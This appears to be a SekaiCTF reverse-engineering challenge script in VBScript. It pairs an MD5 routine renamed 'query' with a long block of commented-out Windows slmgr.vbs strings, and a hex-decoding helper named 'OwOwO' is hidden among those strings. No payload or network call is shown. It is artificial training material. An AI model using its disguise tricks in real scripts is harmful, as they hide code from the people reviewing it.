' Hi SekaiCTF player, this is a simple and totally legit script :)

Private Const BITS_TO_A_BYTE = 8
Private Const BYTES_TO_A_WORD = 4
Private Const BITS_TO_A_WORD = 32
Private m_lOnBits(30)
Private m_l2Power(30)

m_lOnBits(0) = CLng(1)
m_lOnBits(1) = CLng(3)
m_lOnBits(2) = CLng(7)
m_lOnBits(3) = CLng(15)
m_lOnBits(4) = CLng(31)
m_lOnBits(5) = CLng(63)
m_lOnBits(6) = CLng(127)
m_lOnBits(7) = CLng(255)
m_lOnBits(8) = CLng(511)
m_lOnBits(9) = CLng(1023)
m_lOnBits(10) = CLng(2047)
m_lOnBits(11) = CLng(4095)
m_lOnBits(12) = CLng(8191)
m_lOnBits(13) = CLng(16383)
m_lOnBits(14) = CLng(32767)
m_lOnBits(15) = CLng(65535)
m_lOnBits(16) = CLng(131071)
m_lOnBits(17) = CLng(262143)
m_lOnBits(18) = CLng(524287)
m_lOnBits(19) = CLng(1048575)
m_lOnBits(20) = CLng(2097151)
m_lOnBits(21) = CLng(4194303)
m_lOnBits(22) = CLng(8388607)
m_lOnBits(23) = CLng(16777215)
m_lOnBits(24) = CLng(33554431)
m_lOnBits(25) = CLng(67108863)
m_lOnBits(26) = CLng(134217727)
m_lOnBits(27) = CLng(268435455)
m_lOnBits(28) = CLng(536870911)
m_lOnBits(29) = CLng(1073741823)
m_lOnBits(30) = CLng(2147483647)
m_l2Power(0) = CLng(1)
m_l2Power(1) = CLng(2)
m_l2Power(2) = CLng(4)
m_l2Power(3) = CLng(8)
m_l2Power(4) = CLng(16)
m_l2Power(5) = CLng(32)
m_l2Power(6) = CLng(64)
m_l2Power(7) = CLng(128)
m_l2Power(8) = CLng(256)
m_l2Power(9) = CLng(512)
m_l2Power(10) = CLng(1024)
m_l2Power(11) = CLng(2048)
m_l2Power(12) = CLng(4096)
m_l2Power(13) = CLng(8192)
m_l2Power(14) = CLng(16384)
m_l2Power(15) = CLng(32768)
m_l2Power(16) = CLng(65536)
m_l2Power(17) = CLng(131072)
m_l2Power(18) = CLng(262144)
m_l2Power(19) = CLng(524288)
m_l2Power(20) = CLng(1048576)
m_l2Power(21) = CLng(2097152)
m_l2Power(22) = CLng(4194304)
m_l2Power(23) = CLng(8388608)
m_l2Power(24) = CLng(16777216)
m_l2Power(25) = CLng(33554432)
m_l2Power(26) = CLng(67108864)
m_l2Power(27) = CLng(134217728)
m_l2Power(28) = CLng(268435456)
m_l2Power(29) = CLng(536870912)
m_l2Power(30) = CLng(1073741824)

Private Function LShift(lValue, iShiftBits)
	
	If iShiftBits = 0 Then
		LShift = lValue
		
		Exit Function
		
	ElseIf iShiftBits = 31 Then
		
		If lValue And 1 Then
			LShift = &H80000000
		Else
			LShift = 0
		End If
		
		Exit Function
		
	ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
		Err.Raise 6
	End If
	
	If (lValue And m_l2Power(31 - iShiftBits)) Then
		LShift = ((lValue And m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) Or &H80000000
	Else
		LShift = ((lValue And m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits))
	End If
	
End Function

Private Function RShift(lValue, iShiftBits)
	
	If iShiftBits = 0 Then
		RShift = lValue
		
		Exit Function
		
	ElseIf iShiftBits = 31 Then
		If lValue And &H80000000 Then
			RShift = 1
		Else
			RShift = 0
		End If
		
		Exit Function
		
	ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
		Err.Raise 6
	End If
	
	RShift = (lValue And &H7FFFFFFE) \ m_l2Power(iShiftBits)
	
	If (lValue And &H80000000) Then
		RShift = (RShift Or (&H40000000 \ m_l2Power(iShiftBits - 1)))
	End If
	
End Function

Private Function RotateLeft(lValue, iShiftBits)
	RotateLeft = LShift(lValue, iShiftBits) Or RShift(lValue, (32 - iShiftBits))
End Function

Private Function AddUnsigned(lX, lY)
Dim lX4
Dim lY4
Dim lX8
Dim lY8
Dim lResult

	lX8 = lX And &H80000000
	lY8 = lY And &H80000000
	lX4 = lX And &H40000000
	lY4 = lY And &H40000000
	lResult = (lX And &H3FFFFFFF) + (lY And &H3FFFFFFF)

	If lX4 And lY4 Then
		lResult = lResult Xor &H80000000 Xor lX8 Xor lY8
	ElseIf lX4 Or lY4 Then
		If lResult And &H40000000 Then
			lResult = lResult Xor &HC0000000 Xor lX8 Xor lY8
		Else
			lResult = lResult Xor &H40000000 Xor lX8 Xor lY8
		End If
	Else
		lResult = lResult Xor lX8 Xor lY8
	End If
	
	AddUnsigned = lResult
	
End Function

Private Function F(x, y, z)
	F = (x And y) Or ((Not x) And z)
End Function

Private Function G(x, y, z)
	G = (x And z) Or (y And (Not z))
End Function

Private Function H(x, y, z)
	H = (x Xor y Xor z)
End Function

Private Function I(x, y, z)
	I = (y Xor (x Or (Not z)))
End Function

Private Sub FF(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b, c, d), x), ac))
	a = RotateLeft(a, s)
	a = AddUnsigned(a, b)
End Sub

Private Sub GG(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b, c, d), x), ac))
	a = RotateLeft(a, s)
	a = AddUnsigned(a, b)
End Sub

Private Sub HH(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b, c, d), x), ac))
	a = RotateLeft(a, s)
	a = AddUnsigned(a, b)
End Sub

Private Sub II(a, b, c, d, x, s, ac)
	a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b, c, d), x), ac))
	a = RotateLeft(a, s)
	a = AddUnsigned(a, b)
End Sub

Private Function ConvertToWordArray(sMessage)
Dim lMessageLength
Dim lNumberOfWords
Dim lWordArray()
Dim lBytePosition
Dim lByteCount
Dim lWordCount
Const MODULUS_BITS = 512
Const CONGRUENT_BITS = 448

	lMessageLength = Len(sMessage)
	lNumberOfWords = (((lMessageLength + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
	ReDim lWordArray(lNumberOfWords - 1)
	lBytePosition = 0
	lByteCount = 0

	Do Until lByteCount >= lMessageLength
		lWordCount = lByteCount \ BYTES_TO_A_WORD
		lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
		lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(Asc(Mid(sMessage, lByteCount + 1, 1)), lBytePosition)
		lByteCount = lByteCount + 1
	Loop
	
	lWordCount = lByteCount \ BYTES_TO_A_WORD
	lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
	lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(&H80, lBytePosition)
	lWordArray(lNumberOfWords - 2) = LShift(lMessageLength, 3)
	lWordArray(lNumberOfWords - 1) = RShift(lMessageLength, 29)
	
	ConvertToWordArray = lWordArray
	
End Function

Private Function WordToHex(lValue)
Dim lByte
Dim lCount

	For lCount = 0 To 3
		lByte = RShift(lValue, lCount * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
		WordToHex = WordToHex & Right("0" & Hex(lByte), 2)
	Next
	
End Function

Public Function query(sMessage)
Dim x
Dim k
Dim AA
Dim BB
Dim CC
Dim DD
Dim a
Dim b
Dim c
Dim d
Const S11 = 7
Const S12 = 12
Const S13 = 17
Const S14 = 22
Const S21 = 5
Const S22 = 9
Const S23 = 14
Const S24 = 20
Const S31 = 4
Const S32 = 11
Const S33 = 16
Const S34 = 23
Const S41 = 6
Const S42 = 10
Const S43 = 15
Const S44 = 21

	x = ConvertToWordArray(sMessage)
	a = &H67452301
	b = &HEFCDAB89
	c = &H98BADCFE
	d = &H10325476
	
	For k = 0 To UBound(x) Step 16
		AA = a
		BB = b
		CC = c
		DD = d
		FF a, b, c, d, x(k + 0), S11, &HD76AA478
		FF d, a, b, c, x(k + 1), S12, &HE8C7B756
		FF c, d, a, b, x(k + 2), S13, &H242070DB
		FF b, c, d, a, x(k + 3), S14, &HC1BDCEEE
		FF a, b, c, d, x(k + 4), S11, &HF57C0FAF
		FF d, a, b, c, x(k + 5), S12, &H4787C62A
		FF c, d, a, b, x(k + 6), S13, &HA8304613
		FF b, c, d, a, x(k + 7), S14, &HFD469501
		FF a, b, c, d, x(k + 8), S11, &H698098D8
		FF d, a, b, c, x(k + 9), S12, &H8B44F7AF
		FF c, d, a, b, x(k + 10), S13, &HFFFF5BB1
		FF b, c, d, a, x(k + 11), S14, &H895CD7BE
		FF a, b, c, d, x(k + 12), S11, &H6B901122
		FF d, a, b, c, x(k + 13), S12, &HFD987193
		FF c, d, a, b, x(k + 14), S13, &HA679438E
		FF b, c, d, a, x(k + 15), S14, &H49B40821
		GG a, b, c, d, x(k + 1), S21, &HF61E2562
		GG d, a, b, c, x(k + 6), S22, &HC040B340
		GG c, d, a, b, x(k + 11), S23, &H265E5A51
		GG b, c, d, a, x(k + 0), S24, &HE9B6C7AA
		GG a, b, c, d, x(k + 5), S21, &HD62F105D
		GG d, a, b, c, x(k + 10), S22, &H2441453
		GG c, d, a, b, x(k + 15), S23, &HD8A1E681
		GG b, c, d, a, x(k + 4), S24, &HE7D3FBC8
		GG a, b, c, d, x(k + 9), S21, &H21E1CDE6
		GG d, a, b, c, x(k + 14), S22, &HC33707D6
		GG c, d, a, b, x(k + 3), S23, &HF4D50D87
		GG b, c, d, a, x(k + 8), S24, &H455A14ED
		GG a, b, c, d, x(k + 13), S21, &HA9E3E905
		GG d, a, b, c, x(k + 2), S22, &HFCEFA3F8
		GG c, d, a, b, x(k + 7), S23, &H676F02D9
		GG b, c, d, a, x(k + 12), S24, &H8D2A4C8A
		HH a, b, c, d, x(k + 5), S31, &HFFFA3942
		HH d, a, b, c, x(k + 8), S32, &H8771F681
		HH c, d, a, b, x(k + 11), S33, &H6D9D6122
		HH b, c, d, a, x(k + 14), S34, &HFDE5380C
		HH a, b, c, d, x(k + 1), S31, &HA4BEEA44
		HH d, a, b, c, x(k + 4), S32, &H4BDECFA9
		HH c, d, a, b, x(k + 7), S33, &HF6BB4B60
		HH b, c, d, a, x(k + 10), S34, &HBEBFBC70
		HH a, b, c, d, x(k + 13), S31, &H289B7EC6
		HH d, a, b, c, x(k + 0), S32, &HEAA127FA
		HH c, d, a, b, x(k + 3), S33, &HD4EF3085
		HH b, c, d, a, x(k + 6), S34, &H4881D05
		HH a, b, c, d, x(k + 9), S31, &HD9D4D039
		HH d, a, b, c, x(k + 12), S32, &HE6DB99E5
		HH c, d, a, b, x(k + 15), S33, &H1FA27CF8
		HH b, c, d, a, x(k + 2), S34, &HC4AC5665
		II a, b, c, d, x(k + 0), S41, &HF4292244
		II d, a, b, c, x(k + 7), S42, &H432AFF97
		II c, d, a, b, x(k + 14), S43, &HAB9423A7
		II b, c, d, a, x(k + 5), S44, &HFC93A039
		II a, b, c, d, x(k + 12), S41, &H655B59C3
		II d, a, b, c, x(k + 3), S42, &H8F0CCC92
		II c, d, a, b, x(k + 10), S43, &HFFEFF47D
		II b, c, d, a, x(k + 1), S44, &H85845DD1
		II a, b, c, d, x(k + 8), S41, &H6FA87E4F
		II d, a, b, c, x(k + 15), S42, &HFE2CE6E0
		II c, d, a, b, x(k + 6), S43, &HA3014314
		II b, c, d, a, x(k + 13), S44, &H4E0811A1
		II a, b, c, d, x(k + 4), S41, &HF7537E82
		II d, a, b, c, x(k + 11), S42, &HBD3AF235
		II c, d, a, b, x(k + 2), S43, &H2AD7D2BB
		II b, c, d, a, x(k + 9), S44, &HEB86D391
		a = AddUnsigned(a, AA)
		b = AddUnsigned(b, BB)
		c = AddUnsigned(c, CC)
		d = AddUnsigned(d, DD)
	Next

	query = LCase(WordToHex(a) & WordToHex(b) & WordToHex(c) & WordToHex(d))
	
End Function

Const HKEY_LOCAL_MACHINE = &H80000002
Const REG_SZ = 1
Const REG_EXPAND_SZ = 2
Const REG_BINARY = 3
Const REG_DWORD = 4
Const REG_MULTI_SZ = 7

'L_optInstallProductKey="ipk"
'L_optInstallProductKeyUsage="Install product key (replaces existing key)"
'L_optUninstallProductKey="upk"
'L_optUninstallProductKeyUsage="Uninstall product key"
'L_optActivateProduct="ato"
'L_optActivateProductUsage="Activate Windows"
'L_optDisplayInformation="dli"
'L_optDisplayInformationUsage="Display license information (default: current license)"
'L_optDisplayInformationVerbose="dlv"
'L_optDisplayInformationUsageVerbose="Display detailed license information (default: current license)"
'L_optExpirationDatime="xpr"
'L_optExpirationDatimeUsage="Expiration date for current license state"
'L_optClearPKeyFromRegistry="cpky"
'L_optClearPKeyFromRegistryUsage="Clear product key from the registry (prevents disclosure attacks)"
'L_optInstallLicense="ilc"
'L_optInstallLicenseUsage="Install license"
'L_optReinstallLicenses="rilc"
'L_optReinstallLicensesUsage="Re-install system license files"
'L_optDisplayIID="dti"
'L_optDisplayIIDUsage="Display Installation ID for offline activation"
'L_optPhoneActivateProduct="atp"
'L_optPhoneActivateProductUsage="Activate product with user-provided Confirmation ID"
'L_optReArmWindows="rearm"
'L_optReArmWindowsUsage="Reset the licensing status of the machine"
'L_optReArmApplication="rearm-app"
'L_optReArmApplicationUsage="Reset the licensing status of the given app"
'L_optReArmSku="rearm-sku"
'L_optReArmSkuUsage="Reset the licensing status of the given sku"
'L_optSetKmsName="skms"
'L_optSetKmsNameUsage="Set the name and/or the port for the KMS computer this machine will use. IPv6 address must be specified in the format [hostname]:port"
'L_optClearKmsName="ckms"
'L_optClearKmsNameUsage="Clear name of KMS computer used (sets the port to the default)"
'L_optSetKmsLookupDomain="skms-domain"
'L_optSetKmsLookupDomainUsage="Set the specific DNS domain in which all KMS SRV records can be found. This setting has no effect if the specific single KMS host is set via /skms option."
'L_optClearKmsLookupDomain="ckms-domain"
'L_optClearKmsLookupDomainUsage="Clear the specific DNS domain in which all KMS SRV records can be found. The specific KMS host will be used if set via /skms. Otherwise default KMS auto-discovery will be used."
'L_optSetKmsHostCaching="skhc"
'L_optSetKmsHostCachingUsage="Enable KMS host caching"
'L_optClearKmsHostCaching="ckhc"
'L_optClearKmsHostCachingUsage="Disable KMS host caching"
'L_optSetActivationInterval="sai"
'L_optSetActivationIntervalUsage="Set interval (minutes) for unactivated clients to attempt KMS connection. The activation interval must be between 15 minutes (min) and 30 days (max) although the default (2 hours) is recommended."
'L_optSetRenewalInterval="sri"
'L_optSetRenewalIntervalUsage="Set renewal interval (minutes) for activated clients to attempt KMS connection. The renewal interval must be between 15 minutes (min) and 30 days (max) although the default (7 days) is recommended."
'L_optSetKmsListenPort="sprt"
'L_optSetKmsListenPortUsage="Set TCP port KMS will use to communicate with clients"
'L_optSetDNS="sdns"
'L_optSetDNSUsage="Enable DNS publishing by KMS (default)"
'L_optClearDNS="cdns"
'L_optClearDNSUsage="Disable DNS publishing by KMS"
'L_optSetNormalPriority="spri"
'L_optSetNormalPriorityUsage="Set KMS priority to normal (default)"
'L_optClearNormalPriority="cpri"
'L_optClearNormalPriorityUsage="Set KMS priority to low"
'L_optSetVLActivationType="act-type"
'L_optSetVLActivationTypeUsage="Set activation type to 1 (for AD) or 2 (for KMS) or 3 (for Token) or 0 (for all)."
'L_optListInstalledILs="lil"
'L_optListInstalledILsUsage="List installed Token-based Activation Issuance Licenses"
'L_optRemoveInstalledIL="ril"
Function OwOwO(h)
  Dim a : a = Split(h)
  Dim i
  For i = 0 To UBound(a)
      a(i) = Chr("&H" & a(i))
  Next
  OwOwO = Join(a, "")
End Function
'L_optRemoveInstalledILUsage="Remove installed Token-based Activation Issuance License"
'L_optListTkaCerts="ltc"
'L_optListTkaCertsUsage="List Token-based Activation Certificates"
'L_optForceTkaActivation="fta"
'L_optForceTkaActivationUsage="Force Token-based Activation"
'L_optADActivate="ad-activation-online"
'L_optADActivateUsage="Activate AD (Active Directory) forest with user-provided product key"
'L_optADGetIID="ad-activation-get-iid"
'L_optADGetIIDUsage="Display Installation ID for AD (Active Directory) forest"
'L_optADApplyCID="ad-activation-apply-cid"
'L_optADApplyCIDUsage="Activate AD (Active Directory) forest with user-provided product key and Confirmation ID"
'L_optADListAOs="ao-list"
'L_optADListAOsUsage="Display Activation Objects in AD (Active Directory)"
'L_optADDeleteAO="del-ao"
'L_optADDeleteAOsUsage="Delete Activation Objects in AD (Active Directory) for user-provided Activation Object"
'L_ParamsActivationID="<Activation ID>"
'L_ParamsActivationIDOptional="[Activation ID]"
'L_ParamsActIDOptional="[Activation ID | All]"
'L_ParamsApplicationID="<Application ID>"
'L_ParamsProductKey="<Product Key>"
'L_ParamsLicenseFile="<License file>"
'L_ParamsPhoneActivate="<Confirmation ID>"
'L_ParamsSetKms="<Name[:Port] | : port>"
'L_ParamsSetKmsLookupDomain="<FQDN>"
'L_ParamsSetListenKmsPort="<Port>"
'L_ParamsSetActivationInterval="<Activation Interval>"
'L_ParamsSetRenewalInterval="<Renewal Interval>"
'L_ParamsVLActivationTypeOptional="[Activation-Type]"
'L_ParamsRemoveInstalledIL="<ILID> <ILvID>"
'L_ParamsForceTkaActivation="<Certificate Thumbprint> [<PIN>]"
'L_ParamsAONameOptional="[Activation Object name]"
'L_ParamsAODistinguishedName="<Activation Object DN | Activation Object RDN>"
'L_MsgHelp_1="Windows Software Licensing Management Tool"
'L_MsgHelp_2="Usage: slmgr.vbs [MachineName [User Password]] [<Option>]"
'L_MsgHelp_3="MachineName: Name of remote machine (default is local machine)"
'L_MsgHelp_4="User:        Account with required privilege on remote machine"
'L_MsgHelp_5="Password:    password for the previous account"
'L_MsgGlobalOptions="Global Options:"
'L_MsgAdvancedOptions="Advanced Options:"
'L_MsgKmsClientOptions="Volume Licensing: Key Management Service (KMS) Client Options:"
'L_MsgKmsOptions="Volume Licensing: Key Management Service (KMS) Options:"
'L_MsgADOptions="Volume Licensing: Active Directory (AD) Activation Options:"
'L_MsgTkaClientOptions="Volume Licensing: Token-based Activation Options:"
'L_MsgInvalidOptions="Invalid combination of command parameters."
'L_MsgUnrecognizedOption="Unrecognized option: "
'L_MsgErrorProductNotFound="Error: product not found."
'L_MsgClearedPKey="Product key from registry cleared successfully."
'L_MsgInstalledPKey="Installed product key %PKEY% successfully."
'L_MsgUninstalledPKey="Uninstalled product key successfully."
'L_MsgErrorPKey="Error: product key not found."
'L_MsgInstallationID="Installation ID: "
'L_MsgPhoneNumbers="Product activation telephone numbers can be obtained by searching the phone.inf file for the appropriate phone number for your location/country. You can open the phone.inf file from a Command Prompt or the Start Menu by running: notepad %systemroot%\system32\sppui\phone.inf"
'L_MsgActivating="Activating %PRODUCTNAME% (%PRODUCTID%) ..."
'L_MsgActivated="Product activated successfully."
'L_MsgActivated_Failed="Error: Product activation failed."
'L_MsgConfID="Confirmation ID for product %ACTID% deposited successfully."
'L_MsgErrorLocalWMI="Error 0x%ERRCODE% occurred in connecting to the local WMI provider."
'L_MsgErrorLocalRegistry="Error 0x%ERRCODE% occurred in connecting to the local registry."
'L_MsgErrorConnection="Error 0x%ERRCODE% occurred in connecting to server %COMPUTERNAME%."
'L_MsgInfoRemoteConnection="Connected to server %COMPUTERNAME%."
'L_MsgErrorConnectionRegistry="Error 0x%ERRCODE% occurred in connecting to the registry on server %COMPUTERNAME%."
'L_MsgErrorImpersonation="Error 0x%ERRCODE% occurred in setting impersonation level."
'L_MsgErrorAuthenticationLevel="Error 0x%ERRCODE% occurred in setting authentication level."
'L_MsgErrorWMI="Error 0x%ERRCODE% occurred in creating a locator object."
'L_MsgErrorText_6="On a computer running Microsoft Windows non-core edition, run 'slui.exe 0x2a 0x%ERRCODE%' to display the error text."
'L_MsgErrorText_8="Error: "
'L_MsgErrorText_9="Error: option %OPTION% needs %PARAM%"
'L_MsgErrorText_11="The machine is running within the non-genuine grace period. Run 'slui.exe' to go online and make the machine genuine."
'L_MsgErrorText_12="Windows is running within the non-genuine notification period. Run 'slui.exe' to go online and validate Windows."
'L_MsgLicenseFile="License file %LICENSEFILE% installed successfully."
'L_MsgKmsPriSetToLow="KMS priority set to Low"
'L_MsgKmsPriSetToNormal="KMS priority set to Normal"
'L_MsgWarningKmsPri="Warning: Priority can only be set on a KMS machine that is also activated."
'L_MsgKmsDnsPublishingDisabled="DNS publishing disabled"
'L_MsgKmsDnsPublishingEnabled="DNS publishing enabled"
'L_MsgKmsDnsPublishingWarning="Warning: DNS Publishing can only be set on a KMS machine that is also activated."
'L_MsgKmsPortSet="KMS port set to %PORT% successfully."
'L_MsgWarningKmsReboot="Warning: a KMS reboot is needed for this setting to take effect."
'L_MsgWarningKmsPort="Warning: KMS port can only be set on a KMS machine that is also activated."
'L_MsgRenewalSet="Volume renewal interval set to %RENEWAL% minutes successfully."
'L_MsgWarningRenewal="Warning: Volume renewal interval can only be set on a KMS machine that is also activated."
'L_MsgActivationSet="Volume activation interval set to %ACTIVATION% minutes successfully."
'L_MsgWarningActivation="Warning: Volume activation interval can only be set on a KMS machine that is also activated."
'L_MsgKmsNameSet="Key Management Service machine name set to %KMS% successfully."
'L_MsgKmsNameCleared="Key Management Service machine name cleared successfully."
'L_MsgKmsLookupDomainSet="Key Management Service lookup domain set to %FQDN% successfully."
'L_MsgKmsLookupDomainCleared="Key Management Service lookup domain cleared successfully."
'L_MsgKmsUseMachineNameOverrides="Warning: /skms setting overrides the /skms-domain setting. %KMS% will be used for activation."
'L_MsgKmsUseMachineName="Warning: /skms setting is in effect. %KMS% will be used for activation."
'L_MsgKmsUseLookupDomain="Warning: /skms-domain setting is in effect. %FQDN% will be used for DNS SRV record lookup."
'L_MsgKmsHostCachingDisabled="KMS host caching is disabled"
'L_MsgKmsHostCachingEnabled="KMS host caching is enabled"
'L_MsgErrorActivationID="Error: Activation ID (%ActID%) not found."
'L_MsgVLActivationTypeSet="Volume activation type set successfully."
'L_MsgRearm_1="Command completed successfully."
'L_MsgRearm_2="Please restart the system for the changes to take effect."
'L_MsgRemainingWindowsRearmCount="Remaining Windows rearm count: %COUNT%"
'L_MsgRemainingSkuRearmCount="Remaining SKU rearm count: %COUNT%"
'L_MsgRemainingAppRearmCount="Remaining App rearm count: %COUNT%"
'L_MsgLicenseStatusUnlicensed="Unlicensed"
'L_MsgLicenseStatusVL="Volume activation will expire %ENDDATE%"
'L_MsgLicenseStatusTBL="Timebased activation will expire %ENDDATE%"
'L_MsgLicenseStatusAVMA="Automatic VM activation will expire %ENDDATE%"
'L_MsgLicenseStatusLicensed="The machine is permanently activated."
'L_MsgLicenseStatusInitialGrace="Initial grace period ends %ENDDATE%"
'L_MsgLicenseStatusAdditionalGrace="Additional grace period ends %ENDDATE%"
'L_MsgLicenseStatusNonGenuineGrace="Non-genuine grace period ends %ENDDATE%"
'L_MsgLicenseStatusNotification="Windows is in Notification mode"
'L_MsgLicenseStatusExtendedGrace="Extended grace period ends %ENDDATE%"
'L_MsgLicenseStatusUnlicensed_1="License Status: Unlicensed"
'L_MsgLicenseStatusLicensed_1="License Status: Licensed"
'L_MsgLicenseStatusVL_1="Volume activation expiration: %MINUTE% minute(s) (%DAY% day(s))"
'L_MsgLicenseStatusTBL_1="Timebased activation expiration: %MINUTE% minute(s) (%DAY% day(s))"
'L_MsgLicenseStatusAVMA_1="Automatic VM activation expiration: %MINUTE% minute(s) (%DAY% day(s))"
'L_MsgLicenseStatusInitialGrace_1="License Status: Initial grace period"
'L_MsgLicenseStatusAdditionalGrace_1="License Status: Additional grace period (KMS license expired or hardware out of tolerance)"
'L_MsgLicenseStatusNonGenuineGrace_1="License Status: Non-genuine grace period."
'L_MsgLicenseStatusNotification_1="License Status: Notification"
'L_MsgLicenseStatusExtendedGrace_1="License Status: Extended grace period"
'L_MsgNotificationErrorReasonNonGenuine="Notification Reason: 0x%ERRCODE% (non-genuine)."
'L_MsgNotificationErrorReasonExpiration="Notification Reason: 0x%ERRCODE% (grace time expired)."
'L_MsgNotificationErrorReasonOther="Notification Reason: 0x%ERRCODE%."
'L_MsgLicenseStatusTimeRemaining="Time remaining: %MINUTE% minute(s) (%DAY% day(s))"
'L_MsgLicenseStatusUnknown="License Status: Unknown"
'L_MsgLicenseStatusEvalEndData="Evaluation End Date: "
'L_MsgReinstallingLicenses="Re-installing license files ..."
'L_MsgLicensesReinstalled="License files re-installed successfully."
'L_MsgServiceVersion="Software licensing service version: "
'L_MsgProductName="Name: "
'L_MsgProductDesc="Description: "
'L_MsgActID="Activation ID: "
'L_MsgAppID="Application ID: "
'L_MsgPID4="Extended PID: "
'L_MsgChannel="Product Key Channel: "
'L_MsgProcessorCertUrl="Processor Certificate URL: "
'L_MsgMachineCertUrl="Machine Certificate URL: "
'L_MsgUseLicenseCertUrl="Use License URL: "
'L_MsgPKeyCertUrl="Product Key Certificate URL: "
'L_MsgValidationUrl="Validation URL: "
'L_MsgPartialPKey="Partial Product Key: "
'L_MsgErrorLicenseNotInUse="This license is not in use."
'L_MsgKmsInfo="Key Management Service client information"
'L_MsgCmid="Client Machine ID (CMID): "
'L_MsgRegisteredKmsName="Registered KMS machine name: "
'L_MsgKmsLookupDomain="Registered KMS SRV record lookup domain: "
'L_MsgKmsFromDnsUnavailable="DNS auto-discovery: KMS name not available"
'L_MsgKmsFromDns="KMS machine name from DNS: "
'L_MsgKmsIpAddress="KMS machine IP address: "
'L_MsgKmsIpAddressUnavailable="KMS machine IP address: not available"
'L_MsgKmsPID4="KMS machine extended PID: "
'L_MsgActivationInterval="Activation interval: %INTERVAL% minutes"
'L_MsgRenewalInterval="Renewal interval: %INTERVAL% minutes"
'L_MsgKmsEnabled="Key Management Service is enabled on this machine"
'L_MsgKmsCurrentCount="Current count: "
'L_MsgKmsListeningOnPort="Listening on Port: "
'L_MsgKmsPriNormal="KMS priority: Normal"
'L_MsgKmsPriLow="KMS priority: Low"
'L_MsgVLActivationTypeAll="Configured Activation Type: All"
'L_MsgVLActivationTypeAD="Configured Activation Type: AD"
'L_MsgVLActivationTypeKMS="Configured Activation Type: KMS"
'L_MsgVLActivationTypeToken="Configured Activation Type: Token"
'L_MsgVLMostRecentActivationInfo="Most recent activation information:"
'L_MsgInvalidDataError="Error: The data is invalid"
'L_MsgUndeterminedPrimaryKey="Warning: SLMGR was not able to validate the current product key for Windows. Please upgrade to the latest service pack."
'L_MsgUndeterminedPrimaryKeyOperation="Warning: This operation may affect more than one target license.  Please verify the results."
'L_MsgUndeterminedOperationFormat="Processing the license for %PRODUCTDESCRIPTION% (%PRODUCTID%)."
'L_MsgPleaseActivateRefreshKMSInfo="Please use slmgr.vbs /ato to activate and update KMS client information in order to update values."
'L_MsgTokenBasedActivationMustBeDone="This system is configured for Token-based activation only. Use slmgr.vbs /fta to initiate Token-based activation, or slmgr.vbs /act-type to change the activation type setting."
'L_MsgKmsCumulativeRequestsFromClients="Key Management Service cumulative requests received from clients"
'L_MsgKmsTotalRequestsRecieved="Total requests received: "
'L_MsgKmsFailedRequestsReceived="Failed requests received: "
'L_MsgKmsRequestsWithStatusUnlicensed="Requests with License Status Unlicensed: "
'L_MsgKmsRequestsWithStatusLicensed="Requests with License Status Licensed: "
'L_MsgKmsRequestsWithStatusInitialGrace="Requests with License Status Initial grace period: "
'L_MsgKmsRequestsWithStatusLicenseExpiredOrHwidOot="Requests with License Status License expired or Hardware out of tolerance: "
'L_MsgKmsRequestsWithStatusNonGenuineGrace="Requests with License Status Non-genuine grace period: "
'L_MsgKmsRequestsWithStatusNotification="Requests with License Status Notification: "
'L_MsgRemoteWmiVersionMismatch="The remote machine does not support this version of SLMgr.vbs"
'L_MsgRemoteExecNotSupported="This command of SLMgr.vbs is not supported for remote execution"
'L_MsgTkaLicenses="Token-based Activation Issuance Licenses:"
'L_MsgTkaLicenseHeader="%ILID%    %ILVID%"
'L_MsgTkaLicenseILID="License ID (ILID): %ILID%"
'L_MsgTkaLicenseILVID="Version ID (ILvID): %ILVID%"
'L_MsgTkaLicenseExpiration="Valid to: %TODATE%"
'L_MsgTkaLicenseAdditionalInfo="Additional Information: %MOREINFO%"
'L_MsgTkaLicenseAuthZStatus="Error: 0x%ERRCODE%"
'L_MsgTkaLicenseDescr="Description: %DESC%"
'L_MsgTkaLicenseNone="No licenses found."
'L_MsgTkaRemoving="Removing Token-based Activation License ..."
'L_MsgTkaRemovedItem="Removed license with SLID=%SLID%."
'L_MsgTkaRemovedNone="No licenses found."
'L_MsgTkaInfoAdditionalInfo="Additional Information: %MOREINFO%"
'L_MsgTkaInfo="Token-based Activation information"
'L_MsgTkaInfoILID="License ID (ILID): %ILID%"
'L_MsgTkaInfoILVID="Version ID (ILvID): %ILVID%"
'L_MsgTkaInfoGrantNo="Grant Number: %GRANTNO%"
'L_MsgTkaInfoThumbprint="Certificate Thumbprint: %THUMBPRINT%"
'L_MsgTkaCertThumbprint="Thumbprint: %THUMBPRINT%"
'L_MsgTkaCertSubject="Subject: %SUBJECT%"
'L_MsgTkaCertIssuer="Issuer: %ISSUER%"
'L_MsgTkaCertValidFrom="Valid from: %FROMDATE%"
'L_MsgTkaCertValidTo="Valid to: %TODATE%"
'L_MsgADInfo="AD Activation client information"
'L_MsgADInfoAOName="Activation Object name: "
'L_MsgADInfoAODN="AO DN: "
'L_MsgADInfoExtendedPid="AO extended PID: "
'L_MsgADInfoActID="AO activation ID: "
'L_MsgActObjAvailable="Activation Objects"
'L_MsgActObjNoneFound="No objects found"
'L_MsgSucess="Operation completed successfully."
'L_MsgADSchemaNotSupported="Active Directory-Based Activation is not supported in the current Active Directory schema."
'L_MsgAVMAInfo="Automatic VM Activation client information"
'L_MsgAVMAID="Guest IAID: "
'L_MsgAVMAHostMachineName="Host machine name: "
'L_MsgAVMALastActTime="Activation time: "
'L_MsgAVMAHostPid2="Host Digital PID2: "
